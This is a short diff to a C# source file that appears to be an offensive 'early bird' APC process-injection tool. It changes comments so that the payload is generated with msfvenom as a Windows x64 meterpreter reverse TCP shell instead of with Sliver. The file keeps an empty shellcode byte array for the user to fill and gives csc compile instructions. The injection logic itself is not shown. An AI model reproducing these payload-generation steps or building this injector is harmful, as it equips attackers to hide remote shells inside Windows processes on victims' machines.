@@ -6,8 +6,8 @@
 // the main thread ever runs. When the thread resumes, the APC executes the
 // shellcode before the process's own entry point — "early bird".
 //
-// Shellcode (Sliver):
-//   sliver > generate --mtls <IP>:<PORT> --format csharp --save /tmp/sc.cs
+// Shellcode (msfvenom):
+//   msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp -o /tmp/sc.cs
 //
 // Compile (Release, x64):
 //   csc /target:exe /platform:x64 /optimize+ /out:apc-injection.exe apc-injection.cs
@@ -68,7 +68,7 @@ namespace ApcInjection
 
         static void Main(string[] args)
         {
-            // ── Paste your shellcode here (sliver > generate --format csharp) ─────
+            // ── Paste your shellcode here (msfvenom -f csharp) ─────
             byte[] buf = new byte[] { /* shellcode bytes */ };
             // ───────────────────────────────────────────────────────────────────
 
